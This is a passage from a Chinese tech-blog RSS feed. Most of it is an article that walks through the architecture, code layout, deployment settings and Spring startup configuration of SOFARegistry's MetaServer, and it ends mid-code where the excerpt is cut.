&lt;code class=&quot;language-java&quot;&gt;&amp;lt;!--配置内部资源视图解析器--&amp;gt;
&amp;lt;bean class=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&amp;gt;  
  &amp;lt;property name=&quot;prefix&quot; value=&quot;/WEB-INF/views/&quot;&amp;gt;&amp;lt;/property&amp;gt; 
     &amp;lt;property name=&quot;suffix&quot; value=&quot;.jsp&quot;&amp;gt;&amp;lt;/property&amp;gt;&amp;lt;/bean&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;以上就是springmvc系列的第一章，主要侧重与原理解析及其一些基础操作，我后续会持续更新，本博客主要侧重于数据结构于算法和java开发，觉得我的文章有帮助的小伙伴可以关注我，有疑问可评论私信，相逢即是缘，大家高处见&quot;&gt;以上就是SpringMVC系列的第一章，主要侧重与原理解析及其一些基础操作，我后续会持续更新，本博客主要侧重于数据结构于算法和java开发，觉得我的文章有帮助的小伙伴可以关注我，有疑问可评论私信，相逢即是缘，大家高处见&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img-blog.csdnimg.cn/2020100821474690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3BqaDg4,size_16,color_FFFFFF,t_70#pic_center&quot; alt=&quot;在这里插入图片描述&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 08 Oct 2020 13:50:00 +0000</pubDate>
<dc:creator>一只胡说八道的猴子</dc:creator>
<og:description>Spring-mvc 什么是SpringMvc SpringMvc是一种基于java的实现Mvc设计模式的请求驱动类型的轻量级web框架，属于SpringFrameWork的后续产品，已经融合在Spr</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/pjhaymy/p/13782927.html</dc:identifier>
</item>
<item>
<title>[源码阅读] 阿里SOFA服务注册中心MetaServer(1)  - 罗西的思考</title>
<link>http://www.cnblogs.com/rossiXYZ/p/13782794.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/rossiXYZ/p/13782794.html</guid>
<description>&lt;p&gt;SOFARegistry 是蚂蚁金服开源的一个生产级、高时效、高可用的服务注册中心。本系列将带领大家一起分析其MetaServer的实现机制，本文为第一篇，介绍MetaServer总体架构。&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;728.68700026476&quot;&gt;


&lt;h2 id=&quot;0x00-摘要&quot;&gt;0x00 摘要&lt;/h2&gt;
&lt;p&gt;SOFARegistry 是蚂蚁金服开源的一个生产级、高时效、高可用的服务注册中心。本系列将带领大家一起分析其MetaServer的实现机制，本文为第一篇，介绍MetaServer总体架构。&lt;/p&gt;
&lt;p&gt;本系列总体参考了官方的博客，具体请参见&quot;0xFF 参考&quot;。大家可以把参考作为总纲，我这系列文章作为注释补遗翻阅。&lt;/p&gt;
&lt;h2 id=&quot;0x01-服务注册中心&quot;&gt;0x01 服务注册中心&lt;/h2&gt;
&lt;h3 id=&quot;11-服务注册中心简介&quot;&gt;1.1 服务注册中心简介&lt;/h3&gt;
&lt;p&gt;在微服务架构下，一个互联网应用的服务端背后往往存在大量服务间的相互调用。例如服务 A 在链路上依赖于服务 B，那么在业务发生时，服务 A 需要知道服务 B 的地址，才能完成服务调用。而分布式架构下，每个服务往往都是集群部署的，集群中的机器也是经常变化的，所以服务 B 的地址不是固定不变的。如果要保证业务的可靠性，服务调用者则需要感知被调用服务的地址变化。&lt;/p&gt;
&lt;p&gt;既然成千上万的服务调用者都要感知这样的变化，&lt;strong&gt;那这种感知能力便下沉成为微服务中一种固定的架构模式：服务注册中心&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;服务注册中心里，有服务提供者和服务消费者两种重要的角色，服务调用方是消费者，服务被调方是提供者。对于同一台机器，往往兼具两者角色，既被其它服务调用，也调用其它服务。服务提供者将自身提供的服务信息发布到服务注册中心，服务消费者通过订阅的方式感知所依赖服务的信息是否发生变化。&lt;/p&gt;
&lt;p&gt;&lt;u&gt;服务注册中心在服务调用的场景中，扮演一个“中介”的角色&lt;/u&gt;，服务发布者 (Publisher) 将服务发布到服务注册中心，服务调用方 (Subscriber) 通过访问服务注册中心就能够获取到服务信息，进而实现调用。&lt;/p&gt;
&lt;p&gt;Subscriber 在第一次调用服务时，会通过 Registry 找到相应的服务的 IP 地址列表，通过负载均衡算法从 IP 列表中取一个服务提供者的服务器调用服务。同时 Subscriber 会将 Publisher 的服务列表数据缓存到本地，供后续使用。当 Subscriber 后续再调用 Publisher 时，优先使用缓存的地址列表，不需要再去请求Registry。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;+----------+                                    +---------+
|Subscriber| &amp;lt;--------+              +--------+ |Publisher|
+----------+          |              |          +---------+
                      |              |
+----------+          |              v
|Subscriber| &amp;lt;--------+   +----------++         +---------+
+----------+          &amp;lt;---+ Registry  | &amp;lt;-------+Publisher|
                      |   +----------++         +---------+
+----------+          |              ^
|Subscriber| &amp;lt;--------+              |
+----------+                         |
                                     |          +---------+
                                     +----------+Publisher|
                                                +---------+
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;服务注册中心Registry的最主要能力是服务注册和服务发现两个过程。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;服务注册的过程最重要是对服务发布的信息进行存储。&lt;/li&gt;
&lt;li&gt;服务发现的过程是把服务发布端的所有变化（包括节点变化和服务信息变化）及时准确的通知到订阅方的过程。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;12-sofaregistry-总体架构&quot;&gt;1.2 SOFARegistry 总体架构&lt;/h3&gt;
&lt;h4 id=&quot;121-分层&quot;&gt;1.2.1 分层&lt;/h4&gt;
&lt;p&gt;SOFARegistry 作为服务注册中心，分为4个层，分别为：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Client 层&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Client 层是应用服务器集群。Client 层是应用层，每个应用系统通过依赖注册中心相关的客户端 jar 包，通过编程方式来使用服务注册中心的服务发布和服务订阅能力。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;Session 层&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;Session层是服务器集群。顾名思义，Session 层是会话层，通过长连接和 Client 层的应用服务器保持通讯，负责接收 Client 的服务发布和服务订阅请求。&lt;/p&gt;
&lt;p&gt;在服务注册中心的服务端因为每个存储节点对应的客户端的链接数据量有限，必须进行特殊的一层划分用于专门收敛无限扩充的客户端连接，然后在透传相应的请求到存储层。&lt;/p&gt;
&lt;p&gt;该层只在内存中保存各个服务的发布订阅关系，对于具体的服务信息，只在 Client 层和 Data 层之间透传转发。&lt;u&gt;Session 层是一个无数据状态的代理层，可以随着 Client 层应用规模的增长而扩容&lt;/u&gt;。&lt;/p&gt;
&lt;p&gt;因为 SOFARegistry 的服务发现需要较高的时效性，对外表现为主动推送变更到客户端，所以推送的主体实现也集中在 Session 层，内部的推拉结合主要是通过 Data 存储层的数据版本变更推送到所有 Session 节点，各个 Session 节点根据存储的订阅关系和首次订阅获取的数据版本信息进行比对，最终确定推送给那些服务消费方客户端。&lt;/p&gt;
&lt;p&gt;数据服务器集群。Data 层通过分片存储的方式保存着所用应用的服务注册数据。数据按照 dataInfoId（每一份服务数据的唯一标识）进行一致性 Hash 分片，多副本备份，保证数据的高可用。&lt;u&gt;Data 层可以随着数据规模的增长，在不影响业务的前提下实现平滑的扩缩容&lt;/u&gt;。&lt;/p&gt;
&lt;p&gt;元数据服务器集群。这个集群管辖的范围是 Session 服务器集群和 Data 服务器集群的服务器信息，&lt;u&gt;其角色就相当于 SOFARegistry 架构内部的服务注册中心&lt;/u&gt;，只不过 SOFARegistry 作为服务注册中心是服务于广大应用服务层，而 Meta 集群是服务于 SOFARegistry 内部的 Session 集群和 Data 集群，&lt;u&gt;Meta 层能够感知到 Session 节点和 Data 节点的变化，并通知集群的其它节点&lt;/u&gt;。&lt;/p&gt;
&lt;h3 id=&quot;13-为什么要分层&quot;&gt;1.3 为什么要分层&lt;/h3&gt;
&lt;p&gt;SOFARegistry 内部为什么要进行数据分层，是&lt;u&gt;因为系统容量的限制&lt;/u&gt;。&lt;/p&gt;
&lt;p&gt;在 SOFARegistry 的应用场景中，体量庞大的数据主要有两类：Session 数据、服务信息数据。两类数据的相同之处在于其数据量都会不断扩展，而不同的是其扩展的原因并不相同：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Session 是对应于 Client 的连接，其数据量是随着业务机器规模的扩展而增长，&lt;/li&gt;
&lt;li&gt;服务信息数据量的增长是由 Publisher 的发布所决定。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;所以 SOFARegistry 通过分层设计，将两种数据隔离，从而使二者的扩容互不影响。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2019/png/307286/1571043263429-9b159551-1c94-4a4f-afbf-199b556cb401.png&quot; alt=&quot;图3 - 分层，扩容互不影响&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这也是 SOFARegistry 设计三层模型的原因，通过 SessionServer 来负责与 Client 的连接，将每个 Client 的连接数收敛到 1，这样当 Client 数量增长时，只需要扩容 SessionServer 集群就可以了。 所以从设计初衷上我们就能够看出来 SessionServer 必须要满足的两个主要能力：从 DataServer 获取服务信息数据；以及保存与 Client 的会话。&lt;/p&gt;

&lt;h3 id=&quot;21简介&quot;&gt;2.1简介&lt;/h3&gt;
&lt;p&gt;MetaServer 在 SOFARegistry 中，承担着集群元数据管理的角色，&lt;u&gt;用来维护集群成员列表&lt;/u&gt;，可以认为是 SOFARegistry 注册中心的注册中心。&lt;/p&gt;
&lt;p&gt;MetaServer 作为 SOFARegistry 的元数据中心，其核心功能可以概括为：集群成员列表管理。比如：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;节点列表的注册与存储&lt;/li&gt;
&lt;li&gt;节点列表的变更通知&lt;/li&gt;
&lt;li&gt;节点健康监测&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;当 SessionServer 和 DataServer 需要知道集群列表，并且需要扩缩容时，MetaServer 将会提供相应的数据。&lt;/p&gt;
&lt;p&gt;其内部架构如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.nlark.com/yuque/0/2019/png/338467/1568254931660-96379e5d-2ed0-472d-affa-edfb99c6bf24.png&quot; alt=&quot;内部架构图&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;MetaServer 基于 Bolt, 通过 TCP 私有协议的形式对外提供服务，包括 DataServer, SessionServer 等，处理节点的注册，续约和列表查询等请求。&lt;/p&gt;
&lt;p&gt;同时也基于 Http 协议提供控制接口，比如可以控制 session 节点是否开启变更通知, 健康检查接口等。&lt;/p&gt;
&lt;p&gt;成员列表数据存储在 Repository 中，Repository 被一致性协议层进行包装，作为 SOFAJRaft 的状态机实现，所有对 Repository 的操作都会同步到其他节点, 通过Rgistry来操作存储层。&lt;/p&gt;
&lt;p&gt;MetaServer 使用 Raft 协议保证高可用和数据一致性， 同时也会保持与注册的节点的心跳，对于心跳超时没有续约的节点进行驱逐，来保证数据的有效性。&lt;/p&gt;
&lt;p&gt;在可用性方面，只要未超过半数节点挂掉，集群都可以正常对外提供服务，半数以上挂掉，Raft 协议无法选主和日志复制，因此无法保证注册的成员数据的一致性和有效性。整个集群不可用 不会影响 Data 和 Session 节点的正常功能，只是无法感知节点列表变化。&lt;/p&gt;
&lt;h3 id=&quot;22-问题&quot;&gt;2.2 问题&lt;/h3&gt;
&lt;p&gt;空谈无用，just show the code。于是让我们带着问题来思考，即从宏观和微观角度来思考MetaServer应该实现什么功能，具体是怎么实现的。&lt;/p&gt;
&lt;p&gt;思考：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;MetaServer具体是以什么方式实现。&lt;/li&gt;
&lt;li&gt;MetaServer如何实现高可用。&lt;/li&gt;
&lt;li&gt;MetaServer如何实现或者应用内部通讯协议。&lt;/li&gt;
&lt;li&gt;MetaServer如何保持DataNode列表和SessionNode列表。&lt;/li&gt;
&lt;li&gt;MetaServer如何处理节点列表变更推送。&lt;/li&gt;
&lt;li&gt;MetaServer如何处理节点列表查询。&lt;/li&gt;
&lt;li&gt;MetaServer如何处理MetaServer如何保证数据一致性。&lt;/li&gt;
&lt;li&gt;各个集群是如何搭建，如何完成高可用。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;下面我们就一一分析。&lt;/p&gt;
&lt;h2 id=&quot;0x03-代码结构&quot;&gt;0x03 代码结构&lt;/h2&gt;
&lt;p&gt;我们在 &lt;code&gt;sofa-registry-5.4.2/server/server/meta/src/main/java/com/alipay/sofa/registry/server/meta&lt;/code&gt; 看看目录和文件结构。&lt;/p&gt;
&lt;p&gt;按照目录我们可以大致了解功能&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;MetaApplication.java ：MetaServer程序主体，入口。&lt;/li&gt;
&lt;li&gt;bootstrap ：负责MetaServer的启动和配置。&lt;/li&gt;
&lt;li&gt;executor ：负责各种定时管理任务，他的启动设置是在 MetaServerBootstrap.initRaft 之中。&lt;/li&gt;
&lt;li&gt;listener ：SOFARegistry 采用了 Handler - Task &amp;amp; Strategy - Listener 的方式来应对服务注册中的各种场景和任务，这样的处理模型能够尽可能的让代码和架构清晰整洁。&lt;/li&gt;
&lt;li&gt;node ：对业务节点的抽象，包括DataNode，SessionNode，MetaNode。&lt;/li&gt;
&lt;li&gt;registry ：通过Registry来操作存储层，所有对 Repository 的操作都会同步到其他节点。&lt;/li&gt;
&lt;li&gt;remoting ：对外交互接口，提供各种对外的 handler。&lt;/li&gt;
&lt;li&gt;repository ：集群节点列表存储在 Repository 中，通过 Raft 强一致性协议对外提供节点注册、续约、列表查询等 Bolt 请求，从而保障集群获得的数据是强一致性的。Repository 被一致性协议层进行包装，作为 SOFAJRaft 的状态机实现。&lt;/li&gt;
&lt;li&gt;resource ：http Server的接口，用来响应控制消息。&lt;/li&gt;
&lt;li&gt;store ：封装了存储节点的操作。&lt;/li&gt;
&lt;li&gt;task ：封装了异步执行逻辑，通过TaskDispatcher，TaskExecutors 来执行各种定义好的异步Task。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;具体代码结构如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;.
├── MetaApplication.java
├── bootstrap
│   ├── AbstractNodeConfigBean.java
│   ├── EnableMetaServer.java
│   ├── MetaServerBootstrap.java
│   ├── MetaServerConfig.java
│   ├── MetaServerConfigBean.java
│   ├── MetaServerConfiguration.java
│   ├── MetaServerInitializerConfiguration.java
│   ├── NodeConfig.java
│   ├── NodeConfigBeanProperty.java
│   └── ServiceFactory.java
├── executor
│   └── ExecutorManager.java
├── listener
│   ├── DataNodeChangePushTaskListener.java
│   ├── PersistenceDataChangeNotifyTaskListener.java
│   ├── ReceiveStatusConfirmNotifyTaskListener.java
│   └── SessionNodeChangePushTaskListener.java
├── node
│   ├── DataNodeService.java
│   ├── MetaNodeService.java
│   ├── NodeOperator.java
│   ├── NodeService.java
│   ├── SessionNodeService.java
│   └── impl
│       ├── DataNodeServiceImpl.java
│       ├── MetaNodeServiceImpl.java
│       └── SessionNodeServiceImpl.java
├── registry
│   ├── MetaServerRegistry.java
│   └── Registry.java
├── remoting
│   ├── DataNodeExchanger.java
│   ├── MetaClientExchanger.java
│   ├── MetaServerExchanger.java
│   ├── RaftExchanger.java
│   ├── SessionNodeExchanger.java
│   ├── connection
│   │   ├── DataConnectionHandler.java
│   │   ├── MetaConnectionHandler.java
│   │   ├── NodeConnectManager.java
│   │   └── SessionConnectionHandler.java
│   └── handler
│       ├── AbstractServerHandler.java
│       ├── DataNodeHandler.java
│       ├── FetchProvideDataRequestHandler.java
│       ├── GetNodesRequestHandler.java
│       ├── RenewNodesRequestHandler.java
│       └── SessionNodeHandler.java
├── repository
│   ├── NodeConfirmStatusService.java
│   ├── NodeRepository.java
│   ├── RepositoryService.java
│   ├── VersionRepositoryService.java
│   ├── annotation
│   │   └── RaftAnnotationBeanPostProcessor.java
│   └── service
│       ├── DataConfirmStatusService.java
│       ├── DataRepositoryService.java
│       ├── MetaRepositoryService.java
│       ├── SessionConfirmStatusService.java
│       ├── SessionRepositoryService.java
│       └── SessionVersionRepositoryService.java
├── resource
│   ├── BlacklistDataResource.java
│   ├── DecisionModeResource.java
│   ├── HealthResource.java
│   ├── MetaDigestResource.java
│   ├── MetaStoreResource.java
│   ├── PersistentDataResource.java
│   ├── RenewSwitchResource.java
│   └── StopPushDataResource.java
├── store
│   ├── DataStoreService.java
│   ├── MetaStoreService.java
│   ├── RenewDecorate.java
│   ├── SessionStoreService.java
│   └── StoreService.java
└── task
    ├── AbstractMetaServerTask.java
    ├── Constant.java
    ├── DataNodeChangePushTask.java
    ├── MetaServerTask.java
    ├── PersistenceDataChangeNotifyTask.java
    ├── ReceiveStatusConfirmNotifyTask.java
    ├── SessionNodeChangePushTask.java
    └── processor
        ├── DataNodeSingleTaskProcessor.java
        ├── MetaNodeSingleTaskProcessor.java
        └── SessionNodeSingleTaskProcessor.java

16 directories, 75 files
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;0x04-启动运行&quot;&gt;0x04 启动运行&lt;/h2&gt;
&lt;p&gt;启动可以参考 &lt;a href=&quot;https://www.sofastack.tech/projects/sofa-registry/server-quick-start/&quot;&gt;https://www.sofastack.tech/projects/sofa-registry/server-quick-start/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;SOFARegistry 支持两种部署模式，分别是集成部署模式及独立部署模式。&lt;/p&gt;
&lt;h3 id=&quot;41-集成部署&quot;&gt;4.1 集成部署&lt;/h3&gt;
&lt;h4 id=&quot;411-linuxunixmac&quot;&gt;4.1.1 Linux/Unix/Mac&lt;/h4&gt;
&lt;p&gt;启动命令：&lt;code&gt;sh bin/startup.sh&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;412-windows&quot;&gt;4.1.2 Windows&lt;/h4&gt;
&lt;p&gt;双击 bin 目录下的 startup.bat 运行文件。&lt;/p&gt;
&lt;h4 id=&quot;413-启动信息&quot;&gt;4.1.3 启动信息&lt;/h4&gt;
&lt;p&gt;通过下列log我们可以看到启动信息。&lt;/p&gt;
&lt;p&gt;MetaApplication&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;[2020-09-12 20:23:05,463][INFO][main][MetaServerBootstrap] - Open meta server port 9612 success!
[2020-09-12 20:23:08,198][INFO][main][MetaServerBootstrap] - Open http server port 9615 success!
[2020-09-12 20:23:10,298][INFO][main][MetaServerBootstrap] - Raft server port 9614 start success!group RegistryGroup
[2020-09-12 20:23:10,322][INFO][main][MetaServerInitializerConfiguration] - Started MetaServer
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;DataApplication&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;[2020-09-12 20:23:25,004][INFO][main][DataServerBootstrap] - Open http server port 9622 success!
[2020-09-12 20:23:26,084][INFO][main][DataServerBootstrap] - start server success
[2020-09-12 20:23:26,094][INFO][main][DataApplication] - Started DataApplication in 10.217 seconds (JVM running for 11.316)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;SessionApplication&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;[2020-09-12 20:23:50,243][INFO][main][SessionServerBootstrap] - Open http server port 9603 success!
[2020-09-12 20:23:50,464][INFO][main][SessionServerInitializer] - Started SessionServer
[2020-09-12 20:23:50,526][INFO][main][SessionApplication] - Started SessionApplication in 12.516 seconds (JVM running for 13.783)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;各个 Server 的默认端口分别为：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;meta.server.sessionServerPort=9610
meta.server.dataServerPort=9611
meta.server.metaServerPort=9612
meta.server.raftServerPort=9614
meta.server.httpServerPort=9615
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可访问三个角色提供的健康监测 API，或查看日志 logs/registry-startup.log：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;# 查看meta角色的健康检测接口：
$ curl http://localhost:9615/health/check
{&quot;success&quot;:true,&quot;message&quot;:&quot;... raftStatus:Leader&quot;}

# 查看data角色的健康检测接口：
$ curl http://localhost:9622/health/check
{&quot;success&quot;:true,&quot;message&quot;:&quot;... status:WORKING&quot;}

# 查看session角色的健康检测接口：
$ curl http://localhost:9603/health/check
{&quot;success&quot;:true,&quot;message&quot;:&quot;...&quot;}
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;42-独立部署&quot;&gt;4.2 独立部署&lt;/h3&gt;
&lt;p&gt;在这里我们可以看出来各种集群是如何搭建，以及如何在集群内部通讯，分布式协调。&lt;/p&gt;
&lt;p&gt;按照常理来说，每个集群都应该依赖zookeeper之类的软件来进行自己内部的协调，比如统一命名服务、状态同步服务、集群管理、分布式应用配置项。但实际上我们没有发现类似的使用。&lt;/p&gt;
&lt;p&gt;具体看配置文件发现，&lt;u&gt;每台机器都要设置所有的metaServer的host&lt;/u&gt;。这说明Data Server, Session Server则强依赖Meta Server。&lt;/p&gt;
&lt;p&gt;实际上，MetaServer 使用 Raft 协议保证高可用和数据一致性， 同时也会保持与注册的节点的心跳，对于心跳超时没有续约的节点进行驱逐，来保证数据的有效性。&lt;u&gt;Meta 层能够感知到 Session 节点和 Data 节点的变化，并通知集群的其它节点&lt;/u&gt;。&lt;/p&gt;
&lt;p&gt;这就涉及到各个角色的 failover 机制：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;MetaServer 集群部署，内部基于 Raft 协议选举和复制，只要不超过 1⁄2 节点宕机，就可以对外服务。&lt;/li&gt;
&lt;li&gt;DataServer 集群部署，基于一致性 Hash 承担不同的数据分片，数据分片拥有多个副本，一个主副本和多个备副本。如果 DataServer 宕机，MetaServer 能感知，并通知所有 DataServer 和 SessionServer，数据分片可 failover 到其他副本，同时 DataServer 集群内部会进行分片数据的迁移。&lt;/li&gt;
&lt;li&gt;SessionServer 集群部署，任何一台 SessionServer 宕机时 Client 会自动 failover 到其他 SessionServer，并且 Client 会拿到最新的 SessionServer 列表，后续不会再连接这台宕机的 SessionServer。&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;421-部署meta&quot;&gt;4.2.1 部署meta&lt;/h4&gt;
&lt;p&gt;每台机器在部署时需要修改 &lt;em&gt;conf/application.properties&lt;/em&gt; 配置：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;# 将3台meta机器的ip或hostname配置到下方(填入的hostname会被内部解析为ip地址)
nodes.metaNode=DefaultDataCenter:&amp;lt;meta_hostname1&amp;gt;,&amp;lt;meta_hostname2&amp;gt;,&amp;lt;meta_hostname3&amp;gt;
nodes.localDataCenter=DefaultDataCenter
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;422-部署data&quot;&gt;4.2.2 部署data&lt;/h4&gt;
&lt;p&gt;每台机器在部署时需要修改 &lt;em&gt;conf/application.properties&lt;/em&gt; 配置：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;# 将3台 meta 机器的 ip 或 hostname 配置到下方(填入的 hostname 会被内部解析为 ip 地址)
nodes.metaNode=DefaultDataCenter:&amp;lt;meta_hostname1&amp;gt;,&amp;lt;meta_hostname2&amp;gt;,&amp;lt;meta_hostname3&amp;gt;
nodes.localDataCenter=DefaultDataCenter
data.server.numberOfReplicas=1000
&lt;/code&gt;
&lt;/pre&gt;
&lt;h4 id=&quot;423-部署-session&quot;&gt;4.2.3 部署 session&lt;/h4&gt;
&lt;p&gt;每台机器在部署时需要修改 &lt;em&gt;conf/application.properties&lt;/em&gt; 配置：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-bash&quot;&gt;# 将3台 meta 机器的 ip 或 hostname 配置到下方(填入的 hostname 会被内部解析为 ip 地址)
nodes.metaNode=DefaultDataCenter:&amp;lt;meta_hostname1&amp;gt;,&amp;lt;meta_hostname2&amp;gt;,&amp;lt;meta_hostname3&amp;gt;
nodes.localDataCenter=DefaultDataCenter
nodes.localRegion=DefaultZone
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;0x05-总体逻辑&quot;&gt;0x05 总体逻辑&lt;/h2&gt;
&lt;p&gt;MetaServer 在启动时，会启动三个 &lt;strong&gt;Bolt Server&lt;/strong&gt;，并且注册 Processor Handler，处理对应的请求:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;DataServer：处理 DataNode 相关的请求；&lt;/li&gt;
&lt;li&gt;SessionServer：处理 SessionNode 相关的请求；&lt;/li&gt;
&lt;li&gt;MetaServer：处理MetaNode相关的请求；&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;然后启动 &lt;strong&gt;HttpServer&lt;/strong&gt;, 用于处理 Admin 请求，提供推送开关，集群数据查询等 Http 接口。&lt;/p&gt;
&lt;p&gt;最后启动 &lt;strong&gt;Raft 服务&lt;/strong&gt;， 每个节点同时作为 RaftClient 和 RaftServer, 用于集群间的变更和数据同步。&lt;/p&gt;
&lt;h3 id=&quot;51-程序主体&quot;&gt;5.1 程序主体&lt;/h3&gt;
&lt;p&gt;MetaServer 是一个SpringBootApplication，主要起作用的就是EnableMetaServer。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@EnableMetaServer
@SpringBootApplication
public class MetaApplication {
    public static void main(String[] args) {
        SpringApplication.run(MetaApplication.class, args);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;具体参见下图&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;+-------------------+
| @EnableMetaServer |
|                   |
|  MetaApplication  |
+-------------------+
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;EnableMetaServer注解引入了MetaServerConfiguration&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
@Documented
@Import(MetaServerConfiguration.class)
public @interface EnableMetaServer {
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;MetaServerConfiguration是各种配置，并且引入 MetaServerInitializerConfiguration负责启动。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Configuration
@Import(MetaServerInitializerConfiguration.class)
@EnableConfigurationProperties
public class MetaServerConfiguration {
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;所以我们可以知道：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;MetaServerConfiguration ：负责配置&lt;/li&gt;
&lt;li&gt;MetaServerInitializerConfiguration ： 负责启动&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;于是程序总结结构演化为下图：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;                                   (Init)
                            +------------------------------------+
                            | MetaServerInitializerConfiguration |
                            +-------------+----------------------+
                                          ^
+-------------------+                     |
| @EnableMetaServer |                     |
|                   |                     |
|  MetaApplication  |                     |
+-------------+-----+                     | (Configuration)
              |                 +---------+---------------+
              +--------------&amp;gt;  | MetaServerConfiguration |
                                +-------------------------+
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;下面我们开始引入配置。&lt;/p&gt;
&lt;h3 id=&quot;52-配置&quot;&gt;5.2 配置&lt;/h3&gt;
&lt;p&gt;MetaServer 模块的各个 bean 在 JavaConfig 中统一配置，JavaConfig 类为 MetaServerConfiguration。&lt;/p&gt;
&lt;h4 id=&quot;521-配置分类&quot;&gt;5.2.1 配置分类&lt;/h4&gt;
&lt;p&gt;MetaServerConfiguration 具体有以下几类配置：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;Bootstrap，负责MetaServer启动配置，是核心启动类。&lt;/li&gt;
&lt;li&gt;ServerConfig，负责MetaServer的配置项，比如MetaServerConfig，NodeConfig，PropertySplitter。&lt;/li&gt;
&lt;li&gt;ServerServiceConfiguration，负责服务相关的配置，比如 sessionNodeService，storeServiceFactory，sessionStoreService。&lt;/li&gt;
&lt;li&gt;ServerRepositoryConfiguration，负责Repository相关的配置，比如dataRepositoryService，sessionRepositoryService等。&lt;/li&gt;
&lt;li&gt;ServerRemotingConfiguration，负责网络相关配置，比如BoltExchange，JerseyExchange，这里随后会重点说明。&lt;/li&gt;
&lt;li&gt;ResourceConfiguration，负责Resource相关配置，比如 jerseyResourceConfig，persistentDataResource。&lt;/li&gt;
&lt;li&gt;ServerTaskConfiguration，负责各种 task 相关配置 ，比如dataNodeSingleTaskProcessor。&lt;/li&gt;
&lt;li&gt;ExecutorConfiguation，ExecutorManager相关配置。&lt;/li&gt;
&lt;li&gt;MetaDBConfiguration，DB相关配置。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;具体缩略版代码如下 ：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;@Configuration
@Import(MetaServerInitializerConfiguration.class)
@EnableConfigurationProperties
public class MetaServerConfiguration {
    @Bean
    @ConditionalOnMissingBean
    public MetaServerBootstrap metaServerBootstrap() {
    }

    @Configuration
    protected static class MetaServerConfigBeanConfiguration {
    }

    @Configuration
    public static class MetaServerServiceConfiguration {
    }

    @Configuration
    public static class MetaServerRepositoryConfiguration {
    }

    @Configuration
